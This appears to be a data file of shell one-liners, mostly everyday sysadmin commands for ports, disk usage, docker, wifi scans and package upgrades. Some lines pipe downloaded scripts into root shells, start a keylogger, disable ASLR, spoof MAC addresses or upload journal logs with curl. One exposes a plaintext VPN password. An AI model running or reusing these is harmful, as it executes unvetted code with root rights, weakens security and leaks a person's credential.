sudo mysqldumpslow -s t /var/log/mysql/mysql-slow.log | less
sudo mysqld_multi stop 5612 && sleep 3 && ps -ef | grep mysql
sudo mysqld_multi stop 5540 && sleep 3 && ps -ef | grep mysql
sudo mysqld_multi stop 5173 && sleep 3 && ps -ef | grep mysql
sudo mysqld_multi start 5612 && sleep 2 && ps -ef | grep mysql
sudo mysqld_multi start 5540 && sleep 2 && ps -ef | grep mysql
sudo mysqld_multi start 5173 && sleep 2 && ps -ef | grep mysql
sudo mount | column -t
sudo mount /dev/sdc1 /mnt/hgfs/ ; cp -p bin/*bin /mnt/hgfs/ ; ll /mnt/hgfs/ | grep *bin ; sudo umount /mnt/hgfs ; echo please plug your Udisk
sudo modprobe v4l2loopback && gphoto2 --stdout --capture-movie | ffmpeg -i - -vcodec rawvideo -pix_fmt yuv420p -threads 0 -s 1980x1080 -f v4l2 /dev/video4
sudo mkdir /lib64;sudo ln -sf $(file -L /usr/bin/env | cut -d
sudo mkdir -pv /var/log/tcpdump; sudo tcpdump 2>&1 | sudo tee /var/log/tcpdump/tcpdump.txt
sudo lspci -vv | grep vfio -B 12
sudo lsof | wc -l
sudo lsof | grep
sudo lsof -w | awk '{ print \$2 \
sudo lsof -t -i tcp:8000 | xargs kill -9
sudo lsof -nP | grep UDP
sudo lsof -nP | grep TCP
sudo lsof -nP | grep --color=never LISTEN
sudo lsof -nP -iTCP -sTCP:LISTEN | grep
sudo lsof -nP -i4UDP | grep LISTEN
sudo lsof -nP -i4TCP | grep LISTEN
sudo lsof -nP -i | grep LISTEN
sudo lsof -n -i4TCP | grep LISTEN
sudo lsof -n -i | grep LISTEN
sudo lsof -n -i :19999 | grep LISTEN
sudo lsof -n -i -P | grep LISTEN
sudo lsof -n -P -i4TCP|grep LISTEN
sudo lsof -n -P -i +c 15 | grep LISTEN
sudo lsof -n -P -i +c 15 | ccze -A
sudo lsof -iTCP -sTCP:LISTEN -n -P | grep 5432
sudo lsof -i | grep LISTEN
sudo lsof -i | grep LIST
sudo lsof -i | grep
sudo lsof -i TCP | grep LISTEN
sudo lsof -i :8080 | grep \
sudo lsof -i :80 | grep \
sudo lsof -i -nP | grep UDP
sudo lsof -i -nP | grep TCP
sudo lsof -i -n | grep ssh
sudo lsof -i -n | grep LISTEN
sudo lsof -i -n | grep -v LISTEN
sudo lsof -i -n | egrep \<sshd\>
sudo lsof -i -n | egrep \<ssh\>
sudo lsof -i -n | egrep \'\<ssh\>\'
sudo lsof -i -n | egrep '\\<ssh\\>'
sudo lsof -i -n | egrep '\<sshd\>'
sudo lsof -i -n | egrep '\<ssh\>'
sudo lsof -i -n -P|grep LISTEN
sudo lsof -i -n -P | grep TCP
sudo lsof -i -n -P | grep LISTEN
sudo lsof -i -n -P | grep -i listen
sudo lsof -i -n -P | grep
sudo lsof -i -n -P | egrep -c ':1087.+ESTABLISHED'
sudo lsof -i -n -P | egrep ':1087.+ESTABLISHED'
sudo lsof -i -n -P | \grep UDP
sudo lsof -i -n -P | \grep TCP
sudo lsof -i -P |grep -i \
sudo lsof -i -P | grep \
sudo lsof -i -P | grep LISTEN
sudo lsof -i -P | grep -i listen
sudo lsof -i -P | grep -i \
sudo lsof -i -P | grep -i 'listen'
sudo lsof -i -P | grep -i $1
sudo lsof -i -P | grep -i
sudo lsof -i -P | grep --color=never -i \
sudo lsof -i -P | grep
sudo lsof -i -P -sTCP:LISTEN | grep --color=auto
sudo lsof -i -P -n| grep
sudo lsof -i -P -n | sort -f
sudo lsof -i -P -n | grep LISTEN
sudo lsof -i -P -n | grep 5432
sudo lsof -a -n -i | grep LISTEN
sudo lsof -U | grep sock
sudo lsof -Pni4 | grep LISTEN
sudo lsof -Pni 2>/dev/null |grep LIST
sudo lsof -Pn | grep LISTEN
sudo lsof -Pan -i tcp -i udp | grep -i 'listen'
sudo lsof -P | grep -i 'listen'
sudo lsof -P -i -n | grep LISTEN
sudo lsof +c 0 | grep '\.Trash'
sudo lsof +aL1 / | grep -v \
sudo lshw | less
sudo lshw -short | grep network
sudo ls |xargs -n1 -P$(nproc) -I{} du -sh {} 2>/dev/null
sudo ls -lShR . | head -500 >> ~/biggest_files.txt && vim ~/biggest_files.txt
sudo ls -1 /var/lib/php/sessions/ | xargs -I {} rm /var/lib/php/sessions/{}
sudo logwatch | less
sudo logkeys --start & sudo tail --follow /var/log/logkeys.log | grep --color -E '[0-9][0-9]:[0-9][0-9]:[0-9][0-9]'
sudo ll |more
sudo less -nS /var/lib/postgresql/9.?/main/pg_log/$( sudo ls -t /var/lib/postgresql/9.?/main/pg_log | head -1 )
sudo launchctl list | grep plexconnect
sudo launchctl list | grep -v apple
sudo launchctl list | \grep $sshServiceName
sudo launchctl list | \grep $cupsServiceName
sudo lastb | awk '{print \$3}'
sudo killall -HUP mDNSResponder; sleep 2; echo macOS DNS Cache Reset | say
sudo killall -HUP mDNSResponder; sleep 2; echo DNS flushed | say
sudo kill `ps -ax | grep
sudo kill -USR1 $(pgrep -l '^dd$' | sed 's/.\{2\}$//')
sudo kill -9 `ps ax|grep
sudo kill -9 $(ps aux | pidof $1)
sudo kill $(ps aux | grep
sudo journalctl /usr/lib/systemd/systemd | ccze -A
sudo journalctl -xe -f | grep
sudo journalctl -u ssh | grep -e Accepted
sudo journalctl -u camos_updater.service -f | ccze
sudo journalctl -u camos_subscriber.service -f | ccze
sudo journalctl -u camos_starter.service -f | ccze
sudo journalctl -u camos_sender.service -f | ccze
sudo journalctl -u camos_recognizer.service -f | ccze
sudo journalctl -u camos_publisher.service -f | ccze
sudo journalctl -u camos_monitor.service -f | ccze
sudo journalctl -u camos_loader.service -f | ccze
sudo journalctl -k | grep -i -e memory -e oom
sudo journalctl -f _TRANSPORT=kernel | ccze -A
sudo journalctl -b 0 --no-pager | tail
sudo iwmon wls3 | sort
sudo iwlist wlp58s0 scan | grep ESSID
sudo iwlist wlp3s0 scan | grep \(Channel
sudo iwlist wlp2s0 scan|grep -A5 \(Channel
sudo iwlist wlp2s0 scan | grep SSID
sudo iwlist wlp1s0 scanning | less
sudo iwlist wlp1s0 scan | grep ESSID
sudo iwlist wlan0 scan|grep ESSID
sudo iwlist wlan0 scan | less
sudo iwlist wlan0 scan | grep essid -B 2
sudo iwlist wlan0 scan | grep ESSID
sudo iwlist scan | less
sudo iwlist scan | grep ESSID
sudo iwlist eth1 scan | grep ESSID
sudo iw wlp3s0 scan | grep SSID
sudo iw wlp2s0b1 scan | awk -f scripts/iwscan.awk
sudo iw dev wlp3s0 scan | less
sudo iw dev wlp3s0 scan | grep SSID
sudo iw dev wlp3s0 scan | grep -e SSID -e signal
sudo iw dev wlp2s0 scan | less -pSSID
sudo iw dev wlp2s0 scan | grep SSID
sudo iw dev wlp1s0 scan |grep SSID
sudo iw dev wlo1 scan|less
sudo iw dev wlo1 scan | rg \
sudo iw dev wifi0 scan | grep -e SSID -e signal:
sudo iw dev $WIRELESS scan | grep -i ssid
sudo iptables-save | iptsfilter
sudo iptables -vnL | env grep docker -i -C 20 --color
sudo iptables -n -L -v --line-numbers | less
sudo iptables -S | grep ACCEPT
sudo iptables -L | grep
sudo iptables -L -v -n --line-numbers | egrep 'Chain [A-Za-z0-9-]+' -A100000
sudo iptables -L -n | grep 1080
sudo iptables --line-numbers -vn -L INPUT | grep -i
sudo ip link set wlp3s0 up ; wicd-cli -ycn `wicd-cli -yl | awk '/MERCURY/ {print $1}'`
sudo ip link set wlp3s0 up && sudo iw dev wlp3s0 scan | less
sudo ip link set enp0s20f0u1c4i2 up | sudo dhcpcd enp0s20f0u1c4i2
sudo iftop -i -P -$(ip addr | grep
sudo ifconfig|grep broadcast
sudo ifconfig en1 ether `openssl rand -hex 6 | sed 's/\(..\)/\1:/g; s/.$//'`
sudo ifconfig en0 ether `openssl rand -hex 6 | sed 's/\(..\)/\1:/g; s/.$//'`; sudo ifconfig en0 ether
sudo ifconfig en0 ether `openssl rand -hex 6 | sed 's/\(..\)/\1:/g; s/.$//'`
sudo ifconfig en0 ether $(openssl rand -hex 6 | sed 's/\(..\)/\1:/g; s/.$//')
sudo ifconfig en0 ether $(openssl rand -hex 6 | sed 's%\(..\)%\1:%g; s%.$%%')
sudo ifconfig -a | perl -nle'/(\d+\.\d+\.\d+\.\d+)/ && print $1'
sudo icinga2 daemon -C | grep Error
sudo hdparm -I /dev/sda | grep level
sudo hdparm -I /dev/sda | grep --color=never -i advanced
sudo grep sshd.*Failed /var/log/auth.log | less
sudo grep sshd.*Did /var/log/auth.log | less
sudo grep sshd /var/log/auth.log | grep
sudo grep -d 'wlp4s0' -t '^(GET|POST) ' 'tcp and port 80'
sudo grep -d 'en1' -t '^(GET|POST) ' 'tcp and port 80'
sudo get-edid | edid-decode
sudo fwupdmgr refresh && echo n | sudo fwupdmgr get-updates && sudo fwupdmgr update
sudo fs_usage | rg swapfile
sudo fs_usage | grep ~/Dropbox
sudo fs_usage | grep mds
sudo fs_usage | grep -v 0.00
sudo fs_usage -w -f filesys -e Terminal tee | tee fs_usage.log
sudo fs_usage -e -f filesystem | grep -v -e CACHE_HIT -e Terminal -e grep
sudo fing | grep -i rasp -B 1
sudo find ~/.cache/yay -name '*.tar.*' | xargs rm -f
sudo find ~/ -name '*~' -print0 | xargs -0 rm
sudo find /var/tmp -name '*.swp' | xargs sudo rm
sudo find /private/var/folders -name gwt | xargs rm -r
sudo find /path/to/Dir -type d -print0 | xargs -0 sudo chmod 775
sudo find /path/to/Dir -type d -print0 | xargs -0 sudo chmod 755
sudo find / |grep
sudo find / | gzip > $DB_FILE
sudo find / | grep $1
sudo find / | grep
sudo find / | dmenu
sudo find / 2>/dev/null | grep
sudo find / 2> >(grep -v 'Permission denied' >&2) | grep
sudo find / -xdev -type f -size +100M -exec ls -la {} \; | sort -nk 5
sudo find / -type f -size +100000k -exec ls -lh {} \; | awk '{ print $9 $5 }'
sudo find / -iname *1564501696813_0001_01_000001* -print0 | sudo tar -czvf backup-1564501696813_0001-20190730.tar.gz --null -T -
sudo find / $1 | grep $1
sudo find . | grep -i
sudo find . | grep
sudo find . \! -user jdubz | sudo xargs -I{} -- chown jdubz: {}
sudo find . -type f -size +30000k -exec ls -lh {} \; | awk '{ print $5
sudo find . -type f -print0 | xargs -0 sudo chmod 664
sudo find . -type f -print0 | xargs -0 sudo chmod 644
sudo find . -type f -name '.DS_Store' -print0 | xargs -0 rm -v
sudo find . -print | grep -i $1
sudo find . -name \* |xargs grep -r
sudo find . -name $1 -print0 | xargs -0 sudo rm -rf
sudo find -mindepth 1 -maxdepth 1 -exec du -hs {} \; | sort -hr
sudo find -X . -type f -size +1M | xargs du -sh
sudo find -L ~/Picture/.forbiddence -type f | sudo xargs -d ""\n"" chmod 600;
sudo find -L ~/Picture/.forbiddence -type d | sudo xargs -d ""\n"" chmod 000"
sudo fdisk -l | grep -A 7 /dev/sd
sudo fdisk -l | grep -A 2 Device
sudo fdisk -l | grep 'Disk /dev/sd'
sudo fdisk --color=always -l /dev/sd? | sed -e '/^$/d' -e 's/Disk \//\nDisk /g'
sudo fdfind . /sys | fzf --multi
sudo exim -z -i | xargs exim -Mrm
sudo exec NetworkManager | nmtui
sudo ethtool enp1s0|grep Speed
sudo efivar -w -n 4a67b082-0a4c-41cf-b6c7-440b29bb8c4f-LoaderEntryDefault -f =(echo -n 'windows\0' | iconv -f utf-8 -t utf-16le)
sudo efibootmgr -v | sed 's:\(.\)\.:\1:g'
sudo echo; sudo echo /etc/php5/apache2/conf.d/20-xdebug.ini | sudo xargs sed -i 's/zend/;zend/'; apacherestart;
sudo echo; sudo echo /etc/php5/apache2/conf.d/20-xdebug.ini | sudo xargs sed -i 's/;zend/zend/'; apacherestart;
sudo echo | sudo dd of=/var/log/apache2/error.log; sudo service apache2 reload
sudo echo powersave | sudo tee /sys/devices/system/cpu/cpu0/cpufreq/scaling_governor /sys/devices/system/cpu/cpu1/cpufreq/scaling_governor /sys/devices/system/cpu/cpu2/cpufreq/scaling_governor /sys/devices/system/cpu/cpu3/cpufreq/scaling_governor /sys/devices/system/cpu/cpu4/cpufreq/scaling_governor /sys/devices/system/cpu/cpu5/cpufreq/scaling_governor /sys/devices/system/cpu/cpu6/cpufreq/scaling_governor /sys/devices/system/cpu/cpu7/cpufreq/scaling_governor
sudo echo performance | sudo tee /sys/devices/system/cpu/cpu0/cpufreq/scaling_governor /sys/devices/system/cpu/cpu1/cpufreq/scaling_governor /sys/devices/system/cpu/cpu2/cpufreq/scaling_governor /sys/devices/system/cpu/cpu3/cpufreq/scaling_governor /sys/devices/system/cpu/cpu4/cpufreq/scaling_governor /sys/devices/system/cpu/cpu5/cpufreq/scaling_governor /sys/devices/system/cpu/cpu6/cpufreq/scaling_governor /sys/devices/system/cpu/cpu7/cpufreq/scaling_governor
sudo echo level auto | sudo tee /proc/acpi/ibm/fan
sudo echo level 7 | sudo tee /proc/acpi/ibm/fan
sudo echo level 6 | sudo tee /proc/acpi/ibm/fan
sudo echo level 5 | sudo tee /proc/acpi/ibm/fan
sudo echo level 4 | sudo tee /proc/acpi/ibm/fan
sudo echo level 3 | sudo tee /proc/acpi/ibm/fan
sudo echo level 2 | sudo tee /proc/acpi/ibm/fan
sudo echo level 1 | sudo tee /proc/acpi/ibm/fan
sudo echo level 0 | sudo tee /proc/acpi/ibm/fan
sudo echo disk | sudo tee /sys/power/state
sudo echo Poo.y6th | sudo openconnect -u id06ezen --authgroup=FAU-Fulltunnel -passwd-on-stdin vpn.fau.de
sudo echo 30 > /sys/class/backlight/intel_backlight/brightness | redshift-gtk
sudo echo 2 | sudo tee /proc/sys/kernel/randomize_va_space
sudo echo 100000 | sudo tee /proc/sys/fs/inotify/max_user_watches
sudo echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
sudo echo &> /dev/null; gpg --decrypt $HOME/.config/vpn/credentials.gpg | sudo openconnect $VPN
sudo echo && (sudo lsof -i -n -P | fzf --header-lines=1)
sudo du -xh --max-depth=1 | sort -h
sudo du -xch . --max-depth=1 | sort -h
sudo du -sx ~/* 2>/dev/null | sort -n
sudo du -sx /bin /boot /dev /etc /evaluation /g /home /lib /lib64 /media /mnt /opt /pash /proc /qsub.log /root /run /sbin /smoosh /srv /sys /tmp /usr /var 2>/dev/null | sort -n
sudo du -sh ./err.txt ./generated.file ./succ.txt | sort -nr
sudo du -sh ./err.txt ./generated.file ./succ.txt | sort -hr
sudo du -sh err.txt generated.file succ.txt | sort -rh
sudo du -sh err.txt generated.file succ.txt | sort -hf
sudo du -sh err.txt generated.file succ.txt | sort -h
sudo du -sh err.txt generated.file succ.txt | pyp
sudo du -sh err.txt generated.file succ.txt 2> /dev/null | sort -rh
sudo du -sh err.txt generated.file succ.txt .[A-Za-z0-9]* 2>/dev/null | sort -h
sudo du -sch .[!.]* err.txt generated.file succ.txt |sort -h
sudo du -s -h err.txt generated.file succ.txt | sort -hr
sudo du -ks ./err.txt ./generated.file ./succ.txt | sort -n
sudo du -k `pwd` | sort -n
sudo du -hxd 1 / | sort -h
sudo du -hsx .[!.]* err.txt generated.file succ.txt | sort -rh
sudo du -hsc $(ls -lpA | awk
sudo du -hs err.txt generated.file succ.txt | sort -h
sudo du -hk err.txt generated.file succ.txt | sort -n
sudo du -hax --max-depth 1 . | sort -h
sudo du -ha --max-depth 1 | sort -h
sudo du -h / | grep -w '[0-9]*G'
sudo du -h / | grep -P
sudo du -h / | grep '^\s*[0-9\.]\+G' 2>/dev/null
sudo du -h / 2>/dev/null | grep '[0-9\.]\+G'
sudo du -h / 2> /dev/null | grep -P '^[0-9\.]+G'
sudo du -h -d 5 / | grep '[0-9]G '
sudo du -h -d 1 . 2>/dev/null | sort -r -h -k1
sudo du -h --max-depth=1 |sort -rh
sudo du -h --max-depth=1 | sort -hr
sudo du -h --max-depth=1 | sort -h
sudo du -h --max-depth=1 --exclude=./homes/* --exclude=./volume/* --exclude=./mnt/* | sort
sudo du -h $1 | grep [0-9]G
sudo du -g -x -d 5 / | awk '$1 >= 3{print}'
sudo du -g -x -d 5 / | awk
sudo du -dsk err.txt generated.file succ.txt | sort -n
sudo du -d 2 -h | sort -rh
sudo du -d 1 -k /home/eval /home/new /home/pash /home/posh /home/xd | sort -n -r
sudo du -d 1 -hat 100000 2> /dev/null | sort -hr
sudo du -d 1 -h 2> /dev/null | sort -hr
sudo du -cha --max-depth=1 -x /var/log | grep -E \
sudo du -ahc -d 3 ./ 2>/dev/null | sort -h
sudo du -ah --max-depth=0 --block-size=MB --time err.txt generated.file succ.txt | sort -nr
sudo du -H --max-depth=1 . | sort -n -r
sudo du --max-depth=5 /bin /boot /dev /etc /evaluation /g /home /lib /lib64 /media /mnt /opt /pash /proc /qsub.log /root /run /sbin /smoosh /srv /sys /tmp /usr /var | sort -rn
sudo du --human-readable --max-depth=1 | sort --human-numeric-sort
sudo du */ -smx | sort -n
sudo dpkg-query -f '${binary:Package}\n' -W | wc -l
sudo dpkg -l | grep -i $1
sudo dpkg -l | grep
sudo dpkg -P `dpkg -l | grep
sudo dpkg --list | grep
sudo dpkg --get-selections | less
sudo dpkg --get-selections | grep -i
sudo dpkg --get-selections | grep 'deinstall'
sudo dpkg --get-selections | grep
sudo dpkg --get-selections | awk '{print \$1}'
sudo docker.io ps -a -q --no-trunc | sudo xargs -r docker.io rm
sudo docker.io ps -a --quiet | while read id; do sudo docker.io rm $id; done
sudo docker-gc ; docker volume ls -qf dangling=true | xargs -r docker volume rm
sudo docker volume ls | head -n
sudo docker volume ls -q -f dangling=true | xargs --no-run-if-empty sudo docker volume rm
sudo docker ps -q | xargs docker stats --no-stream
sudo docker ps -q | xargs --no-run-if-empty sudo docker stop
sudo docker ps -q -f status=exited | xargs --no-run-if-empty sudo docker rm
sudo docker ps -q -a | xargs docker rm
sudo docker ps -a | less -S
sudo docker ps -a | env grep --color
sudo docker ps -a -q | xargs sudo docker rm -f
sudo docker network ls | head -n
sudo docker images|perl -ane
sudo docker images | grep
sudo docker images | env grep --color
sudo docker images -q | xargs sudo docker rmi
sudo docker images -q | xargs -L1 docker rmi
sudo docker images -q -f dangling=true | xargs --no-run-if-empty sudo docker rmi
sudo docker images -q -f dangling=true | xargs --no-run-if-empty sudo docker rm
sudo docker image ls | less
sudo docker image ls | head -n
sudo docker image ls | grep
sudo docker exec -it \`sudo docker ps -q | head -1\` bash
sudo docker container ps | head -n
sudo docker container ls | grep
sudo docker build . | tee /tmp/docker-build-out
sudo dnf remove \$(rpm -qa | awk -v verinfo=\$(uname -r) 'BEGIN{gsub(\
sudo dnf history | more
sudo dmidecode|perl -ne 'print if /0x0001/ .. /0x0002/'
sudo dmidecode| grep 'memory device' -i -A 10
sudo dmidecode | less
sudo dmidecode | grep DDR -C 10
sudo dmidecode -t processor | grep Speed
sudo dmidecode -t 0 | grep Version
sudo dmidecode -t 0 | \grep Version
sudo dmidecode --type 17 | more
sudo dmesg|tail
sudo dmesg | tail -n 50
sudo dmesg | less
sudo dmesg | grep tty
sudo dmesg -we --color=always | less -R
sudo dmesg --color=always | less -R
sudo df -h /;du -hs err.txt generated.file succ.txt | sort -h
sudo debsums -c | xargs -rd
sudo deborphan | xargs sudo apt-get -y remove --purge
sudo deborphan --guess-all | sudo xargs apt-get -y remove --purge
sudo dd if=/dev/mmcblk0 | gzip -c > /mnt/XFSArchive1/Archives/RPI-Backup-`date +%Y%m%d`.iso.gz
sudo dd if=/dev/mem bs=1k skip=768 count=512 2>/dev/null | strings -n 8
sudo curl -sSL https://install.pi-hole.net | bash
sudo curl -sSL https://get.docker.com | sudo sh
sudo crontab -l | grep
sudo colortail -f /var/log/messages | grep Shorewall
sudo chown ${USER}:$(groups |awk '{ print $1}')
sudo chmod 777 /sys/class/leds/asus::kbd_backlight/brightness && echo 3 | tee /sys/class/leds/asus::kbd_backlight/brightness
sudo chmod 777 /sys/class/leds/asus::kbd_backlight/brightness && echo 0 | tee /sys/class/leds/asus::kbd_backlight/brightness
sudo chmod -R g+rw . && sudo chgrp -R dev . && find . -type d | sudo xargs chmod g+s
sudo chmod +r /var/log/messages; xterm -geometry 141x59+0+0 -fg white -bg black -sb -T '/var/log/messages' -e 'tail -f -n 1000 /var/log/messages | egrep -v \
sudo cat /var/log/syslog | grep $1
sudo cat /var/log/syslog | grep
sudo cat /var/log/auth.log | grep fail
sudo cat /var/log/auth.log | grep 'Failed password for root' --count
sudo cat /var/log/audit/audit.log | audit2why
sudo cat /etc/trueuserowners | grep
sudo cat /etc/trueuserdomains | grep
sudo cat /dev/serial0 | tee ~/`date +'%Y%m%d-%H-%M-%S'`.nmea
sudo arp-scan --localnet | grep b8:27:eb
sudo arp-scan --localnet --interface=en0 | grep b8:27:eb
sudo aptitude remove -P ?and(~i~nlinux-(ima|hea) ?not(~n`uname -r`))
sudo aptitude remove -P ?and(~i~nlinux-(ima|hea) ?not(~n$(uname -r)))
sudo apt-get update; sudo apt-get upgrade; curl -o- http://www.offirmo.net/open-source-dev-env/provisioning/ubuntu/superuser_cleanup.sh | sudo bash
sudo apt-get update && yes | sudo apt-get upgrade
sudo apt-get update && sudo apt-get upgrade -y | tee /var/log/divers/packages-update-$(date +%F).log
sudo apt-get update && sudo apt-get upgrade -y && sudo apt-get dist-upgrade -y && sudo apt-get autoremove -y && sudo apt-get autoclean -y && cpan-outdated -p | cpanm
sudo apt-get update && sudo apt-get upgrade -y && sudo apt-get clean && sudo apt-get autoremove && clear && screenfetch | lolcat
sudo apt-get update && sudo apt-get upgrade --only-upgrade -y | tee /var/log/divers/packages-update-$(date +%F).log; sudo apt-get -f install; sudo apt autoclean; sudo apt autoremove
sudo apt-get update && (apt list --upgradable | pg)
sudo apt-get remove --purge $(dpkg -l | grep
sudo apt-get remove --purge $(dpkg -l 'linux-image-*' | sed '/^ii/!d;/'
sudo apt-get remove --purge $(dpkg -l 'linux-*' | sed '/^ii/!d;/'\
sudo apt-get purge `deborphan | xargs`
sudo apt-get clean && deborphan | xargs -i sudo dpkg --purge {}
sudo apt-get -y autoclean && sudo apt-get -y autoremove && sudo apt-get -y clean && sudo apt-get -y remove && sudo deborphan | xargs sudo apt-get -y remove --purge
sudo apt update; apt upgrade; apt clean; apt autoremove; npm install npm -g; npm update -g; sudo gem update --system; sudo gem update; sudo gem cleanup; pip freeze --local | grep -v
sudo apt update | sudo apt upgrade
sudo apt update && yes y | sudo apt upgrade
sudo apt list 2>/dev/null | command grep installed
sudo apt install -V $(apt-get -s dist-upgrade | awk
sudo apachectl restart | mysql.server restart
sudo adu -d 1 -ha | sort -h
sudo a2dismod php7.0 ; sudo a2enmod php5.6 ; sudo service apache2 restart ; echo 1 | sudo update-alternatives --config php
sudo a2dismod php5.6 ; sudo a2enmod php7.0 ; sudo service apache2 restart ; echo 2 | sudo update-alternatives --config php
sudo `fc -ln 0 | sed
sudo `cat \`readlink -f $HISTFILE\` | tail -n1`
sudo \lsof -ni -P | grep LISTEN
sudo \`history -1 | awk '{ \$1=\
sudo \$(history -1 | cut -d' ' -f 2-)
sudo /usr/sbin/lsof -nP | grep UDP
sudo /usr/sbin/lsof -nP | grep TCP
sudo /usr/sbin/lsof -i | grep LISTEN
sudo /usr/sbin/lsof -i -n -P | grep UDP
sudo /usr/sbin/lsof -i -n -P | grep TCP
sudo /usr/sbin/iw wlan1 scan |less
sudo /usr/sbin/iw wlan0 scan |less
sudo /usr/sbin/iostat -I -x -w 1 |grep -v pass
sudo /usr/local/nagios/bin/nagios -v /usr/local/nagios/etc/nagios.cfg | grep Error
sudo /usr/bin/pacman -Qtdq > /dev/null && sudo /usr/bin/pacman -Rs \$(/usr/bin/pacman -Qtdq | sed -e ':a;N;$!ba;s/\n/ /g')
sudo /usr/bin/lsof -nP | grep UDP
sudo /usr/bin/lsof -nP | grep TCP
sudo /usr/bin/lsof -i | grep LISTEN
sudo /usr/bin/journalctl -b | /usr/bin/curl -F
sudo /usr/bin/iw wifi0 scan | grep SSID
sudo /sbin/ifconfig en0 ether \`openssl rand -hex 6 | sed 's/\(..\)/\1:/g; s/.$//'\`
sudo /sbin/chkconfig --list |grep '3:on'
sudo /opt/vc/bin/vcgencmd measure_clock arm | cut -d
sudo /opt/lampp/lampp status | grep -h MySQL
sudo /opt/MegaRAID/storcli/storcli64 /c0 /vall show |grep RAID
sudo /opt/MegaRAID/storcli/storcli64 /c0 /eall /sall show |grep SATA'
sudo /opt/MegaRAID/MegaCli/MegaCli64 -LDInfo -Lall -aALL|grep State
sudo /home/manu/netbeans-8.2/bin/netbeans && find /home/manu/ -user root -group root | xargs sudo chown manu:manu
sudo /etc/rc.d/atd start && echo 'sudo halt' | at
sudo /bin/df -hP | column -t
sudo /System/Library/PrivateFrameworks/Apple80211.framework/Resources/airport -z; sudo ifconfig en0 ether a0$(openssl rand -hex 5 | sed 's/\(..\)/:\1/g');
sudo ./socketfilterfw -l | grep TRUSTEDAPPS
sudo ./responses.txt | ~/swanked-out-bash/.clear-git-credentials.bash
sudo ./bm-pcap-run.vlks.sh 2>&1 | tee log.log
sudo -v; sudo find -xf /.Trashes /Volumes /Library /private /Temp* -type f -size +200000 -print0 | sudo xargs -0 ls -lohdSr
sudo -v; brew cask outdated | xargs -L1 brew cask reinstall
sudo -v && wget -nv -O- https://raw.githubusercontent.com/kovidgoyal/calibre/master/setup/linux-installer.py | sudo python2 -c \
sudo -v && wget -nv -O- https://download.calibre-ebook.com/linux-installer.sh | sudo sh /dev/stdin
sudo -u root netstat -tulanp | f
sudo -u postgres pg_dumpall -U postgres -h 127.0.0.1 | tar czvf db_all_`date +%F`.sql
sudo -n uptime 2>&1 | grep load
sudo -i docker stats $(sudo docker ps | awk
sudo -H pip3 freeze --local | grep -v
sudo -H pip2 freeze --local | grep -v
sudo -H pip list --outdated --format=freeze | grep -v
sudo -H /usr/local/bin/python3 -m pip list --outdated --format=freeze | grep -v
sudo -E pip freeze | grep -i
sudo $(fc -ln |tail -1)
sudo $(fc -ln | tail -n 1)
suchastyle | git commit
subsubsection\|%' -v"
subl `git status --porcelain | awk '{print $2}'`
subl $(git status --porcelain | awk
subl $(ghq root)/$(ghq list | peco)
subl $(ag | fzf --preview 'head -100 {}')
su daniel.zinov-admin -c 'sudo launchctl list' | grep -v com.apple
stty -a | awk 'BEGIN{RS=\
strstrip | copy
striptnl | pbcopy
stripcolors | tee
stripcol | cut -f 1 -d ' '
strip_ansi_color | xargs -n 1
strip_ansi_color | xargs -i -n 1
strip_ansi_color | xargs --null -n 1
strip_ansi_color | xargs --null -i -n 1
strings ~/Items/.DB/* | grep
strings /dev/urandom | grep -o
strings /boot/dtbs/${d_sys}/${f_dtb} | grep '.dts'
strings -n8 /dev/urandom | egrep
strings $TB_HOME/bin/tbboot | grep Build
strace -p $1 2>&1 | grep lstat
stopmap; rml; echo 'use map_db; DELETE FROM task_queue; UPDATE template_instance SET status=2; UPDATE template SET template_status=2' | mysql
stopdockers && dropdb cms && createdb cms && zcat ~/Downloads/cmsdb/cms.sql.Z | psql -f - cms
stodo rep|pr -n -t
stf | awk '{ print \$2 }'
stdbuf -oL sed -E -e 's/debug1: //g' | ts '[%Y-%m-%d %H:%M:%S]'
status agenda | head -25
status -m kube | grep
stat -s $1 | awk '{ print $8 }'
stat -c '%w %n' err.txt generated.file succ.txt | sort -k1r
stat -c '%W %n' err.txt generated.file succ.txt | sort -k1n
stat -c %a\ %N\ %G\ %U \${PWD}/*|sort
stat -c %a %N %G %U ${PWD}/*|sort
stat --printf='%A\t%a\t%h\t%U\t%G\t%s\t%.19y\t%n\n' *(DN) | numfmt --to=iec-i --field=6 --delimiter=' ' --suffix=B
stat --format='%a %A %10U %10G %20F %n' ./err.txt ./generated.file ./succ.txt . .. | grep
stat %a %N %G %U ${PWD}/*|sort
startx -- vt$(echo $TTY | sed -r 's/.*tty(.*).*/\1/g')
startx -- -keeptty -nolisten tcp >| $HOME/.xorg.log 2>&1
startx &>| ~/.xlog
standard --verbose | snazzy
standard --fix | snazzy
stack ghci 2>&1 | stack exec HsColour -- -tty
stack dot | dot -Tpng -o
stack dot --no-include-base --external --depth 1 | dot -Tpng -o
st |grep ^C
st | grep ^M
st | grep ^C
st | grep ^?
st | grep -P '^[A-Z]{2}'
st | grep '? '
st | cut -c 9-
ssudo 'apt-get update > /dev/null 2>&1 && apt-get upgrade -usy | grep \ \ -A 1'
ssu status | awk '/UID/{print\$NF}'
sstq | xargs ls -ltrh
ssq | grep '^M'
sshare -u bjarnold | grep
ssh_decrypt agco | sudo openconnect savpn.agcocorp.com -u
ssh_add_if_empty && `which -a nvim | tail -n 1`
ssh.${i}.list | awk '{ print \$6 }'
ssh-keyscan localhost 2>/dev/null | ssh-keygen -E md5 -lf -
ssh-keygen -E md5 -lf ~/.ssh/id_rsa.pub | awk '{print $2}'
ssh-keygen -D /usr/lib/ssh-keychain.dylib | head -n 1
ssh-agent | grep -v echo > ~/tmp/ssh-agent-vars; . ~/tmp/ssh-agent-vars; ssh-add
ssh-agent | grep -v echo > ~/.ssh/ssh.agent && source ~/.ssh/ssh.agent && ssh-add
ssh-agent -t 12h | grep -v echo > ~/.ssh/ssh_${HOST}_${USER}.agent && source ~/.ssh/ssh_${HOST}_${USER}.agent && ssh-add
ssh-agent -s| grep -v echo > ~/.agent_cmd ; . ~/.agent_cmd
ssh-add -t `echo 6*3600 | bc` ~/.ssh/home ~/.ssh/id_rsa
ssh-add -l | grep 'The agent has no identities' && ssh-add
ssh-add -K && aws ecr get-login --no-include-email | sh -
ssh-add $(ls ~/.ssh/*.pub | sed
ssh-add $(ls -1 ~/.ssh/*id_rsa | grep -v .pub)
ssh vecna@${COMPUTER_NAME} 'export ROS_MASTER_URI=http://localhost:11311; rostopic echo /remote_assist_alert' | alert-on-message
ssh username@ip.for.do.droplet | lolcat
